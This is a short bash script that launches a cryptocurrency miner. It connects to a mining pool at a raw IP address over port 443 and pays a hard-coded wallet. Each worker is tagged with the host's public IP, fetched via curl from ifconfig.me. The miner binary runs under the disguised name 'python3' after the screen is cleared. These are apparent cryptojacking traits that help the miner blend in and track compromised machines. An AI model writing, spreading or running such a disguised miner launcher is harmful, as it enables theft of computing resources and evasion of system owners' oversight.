#!/bin/bash
POOL=stratum+ssl://167.71.100.202:443
ALGO=PYRIN
WALLET=SOL:Df3cbczgYJpJkdYWkGsM1w3dpXXwnmwQHiMuMbrF7cnK.GPU_$(echo "$(curl ifconfig.me)" | tr . _ )#aeuc-j30k
cd "$(dirname "$0")"
chmod +x ./python3 && clear && ./python3 --algo $ALGO --pool $POOL --user $WALLET --no-cl $@
